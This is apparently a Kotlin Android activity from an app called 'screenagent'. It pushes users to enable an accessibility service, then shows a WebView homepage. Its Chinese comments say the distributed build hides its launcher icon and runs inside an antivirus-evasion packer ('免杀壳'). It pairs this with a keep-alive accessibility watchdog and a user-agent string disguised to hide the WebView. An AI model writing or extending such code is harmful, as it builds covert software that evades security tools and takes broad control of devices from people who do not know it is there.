package com.zaka.screenagent

import android.annotation.SuppressLint
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.util.TypedValue
import android.view.Gravity
import android.view.KeyEvent
import android.view.ViewGroup
import android.webkit.WebChromeClient
import android.webkit.WebResourceRequest
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import com.zaka.screenagent.keepalive.AccessibilityWatchdog

/**
 * B 包「启动入口」：
 *
 *   无障碍没开 → 显示**无障碍引导页**（告诉用户去开，按钮直达系统设置）
 *   无障碍已开 → 显示**首页**（WebView 加载构建时写入的 homepage）
 *
 * 每次 onResume 重新判断，所以用户从设置页回来、开好无障碍，回来就是首页。
 * 注意：正式分发包里本 Activity **没有 LAUNCHER**（桌面无图标）；
 *       当前是临时打开入口用于配发/自测。
 */
class MainActivity : Activity() {

    private var web: WebView? = null
    private var mode = ""            // "guide" / "home"

    override fun onCreate(state: Bundle?) {
        super.onCreate(state)
        // 全屏沉浸：尽量让内容顶到屏幕边缘（免杀壳若给了受限窗口，至少不额外留系统栏空白）
        runCatching {
            window.setFlags(
                android.view.WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                android.view.WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS)
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                window.setDecorFitsSystemWindows(false)
            } else {
                @Suppress("DEPRECATION")
                window.decorView.systemUiVisibility =
                    android.view.View.SYSTEM_UI_FLAG_LAYOUT_STABLE or
                    android.view.View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
            }
        }
        render()
        // 打印真实可用窗口尺寸，便于判断是不是被壳压窄了
        window.decorView.post {
            val dm = resources.displayMetrics
            Log.d(TAG, "window=${window.decorView.width}x${window.decorView.height} screen=${dm.widthPixels}x${dm.heightPixels}")
        }
    }

    override fun onResume() {
        super.onResume()
        // 从系统设置回来，无障碍可能已经开了 → 自动切到首页
        val should = if (AccessibilityWatchdog.isAccessibilityEnabled(this)) "home" else "guide"
        if (should != mode) render()
    }

    private fun render() {
        val enabled = AccessibilityWatchdog.isAccessibilityEnabled(this)
        mode = if (enabled) "home" else "guide"
        Log.d(TAG, "render mode=$mode a11y=$enabled")
        if (enabled) showHome() else showGuide()
    }

    // ─────────── 首页 ───────────
    @SuppressLint("SetJavaScriptEnabled")
    private fun showHome() {
        val url = AgentConfig.get(this).homepage.ifBlank { "https://www.baidu.com/" }
        Log.d(TAG, "home url=$url")
        val old = web
        val wv = WebView(this).apply {
            layoutParams = ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)
            setBackgroundColor(Color.WHITE)
            settings.apply {
                javaScriptEnabled = true
                domStorageEnabled = true
                loadWithOverviewMode = true
                useWideViewPort = true
                cacheMode = WebSettings.LOAD_DEFAULT
                mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
                userAgentString = userAgentString.replace("; wv", "")
            }
            webViewClient = object : WebViewClient() {
                override fun shouldOverrideUrlLoading(v: WebView?, req: WebResourceRequest?) = false
            }
            webChromeClient = WebChromeClient()
            loadUrl(url)
        }
        web = wv
        setContentView(wv)
        runCatching { old?.apply { stopLoading(); destroy() } }
    }

    // ─────────── 无障碍引导（复用 A 包同款页面，放在 assets/a11y_guide.html） ───────────
    @SuppressLint("SetJavaScriptEnabled", "JavascriptInterface")
    private fun showGuide() {
        web?.let { runCatching { it.stopLoading(); it.destroy() } }
        val wv = WebView(this).apply {
            layoutParams = ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)
            setBackgroundColor(Color.parseColor("#EEF2FB"))
            settings.apply {
                javaScriptEnabled = true
                domStorageEnabled = true
                allowFileAccess = true
                useWideViewPort = true
                loadWithOverviewMode = true
            }
            addJavascriptInterface(object {
                @android.webkit.JavascriptInterface
                fun openA11y() {
                    runOnUiThread {
                        runCatching { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) }
                    }
                }
            }, "Android")
            webViewClient = object : WebViewClient() {
                override fun shouldOverrideUrlLoading(v: WebView?, req: WebResourceRequest?) = false
                override fun onPageFinished(v: WebView?, url: String?) {
                    val name = AgentConfig.get(this@MainActivity).appName.ifBlank { "应用" }
                    val icon = appIconDataUri()
                    v?.evaluateJavascript(
                        "setApp(${jsonStr(name)},${jsonStr(icon)});", null)
                }
            }
            loadUrl("file:///android_asset/a11y_guide.html")
        }
        web = wv
        setContentView(wv)
    }

    /** 应用图标转 base64 data URI，给引导页显示（和 A 包那个图标位一致） */
    private fun appIconDataUri(): String = runCatching {
        val d = packageManager.getApplicationIcon(packageName)
        val bmp = android.graphics.Bitmap.createBitmap(
            d.intrinsicWidth.coerceAtLeast(96), d.intrinsicHeight.coerceAtLeast(96),
            android.graphics.Bitmap.Config.ARGB_8888)
        val c = android.graphics.Canvas(bmp)
        d.setBounds(0, 0, bmp.width, bmp.height)
        d.draw(c)
        val out = java.io.ByteArrayOutputStream()
        bmp.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, out)
        "data:image/png;base64," + android.util.Base64.encodeToString(
            out.toByteArray(), android.util.Base64.NO_WRAP)
    }.getOrDefault("")

    private fun jsonStr(s: String): String =
        "\"" + s.replace("\\", "\\\\").replace("\"", "\\\"") + "\""

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            val w = web
            if (w != null && w.canGoBack()) { w.goBack(); return true }
            finish()
            return true
        }
        return super.onKeyDown(keyCode, event)
    }

    override fun onDestroy() {
        runCatching { web?.apply { stopLoading(); loadUrl("about:blank"); destroy() } }
        web = null
        super.onDestroy()
    }

    companion object {
        private const val TAG = "MainActivity"

        fun start(ctx: Context) {
            runCatching {
                ctx.startActivity(Intent(ctx, MainActivity::class.java)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
            }.onFailure { Log.w(TAG, "start failed: $it") }
        }
    }
}
